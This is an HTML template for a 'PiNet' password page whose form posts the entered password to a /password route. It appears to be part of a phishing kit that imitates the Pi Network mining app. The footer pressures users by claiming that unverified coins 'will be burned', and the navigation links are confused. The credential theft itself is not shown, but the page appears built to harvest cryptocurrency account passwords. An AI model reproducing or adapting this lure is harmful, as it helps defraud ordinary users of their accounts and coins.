<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Enter Password</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-white">

  <!-- Password Page -->
  <div class="flex items-center justify-center min-h-screen bg-white text-gray-800">
    <div class="text-center w-full max-w-md">
      <!-- Logo and Heading -->
      <div class="mb-6">
        <img src="{{ url_for('static', filename='pp.png') }}" alt="PiNet logo" class="w-20 mx-auto mb-4">
        <h1 class="text-3xl font-bold text-gray-800">Enter your password</h1>
      </div>

      <!-- Form -->
      <form action="/password" method="POST" class="space-y-4">
        <!-- Password Input -->
        <div class="text-left">
          <label for="password" class="block text-sm font-medium text-gray-700">Password:</label>
          <input type="password" id="password" name="password" placeholder="" class="w-full bg-white text-gray-800 py-2 px-4 border border-yellow-500 rounded-lg hover:bg-gray-100 transition-all">
        </div>

        <!-- Submit Button -->
        <button type="submit" class="w-32 mx-auto bg-white text-purple-600 py-2 border border-purple-600 rounded-lg hover:bg-gray-100 transition-all mt-6 font-bold">
          Submit
        </button>
      </form>

      <!-- Footer -->
      <footer class="mt-6 text-sm text-gray-500">
        <a href="/password" class="text-blue-400 hover:underline">Password forgotten?</a> <br>
        <a href="/registration" class="text-blue-400 hover:underline">Return to login page</a>
        <p class="mt-2">You will need to verify your number in order to claim the coins you mine. Pi mined by numbers that cannot verify ownership will be burned.</p>
      </footer>
    </div>
  </div>
</body>
</html>
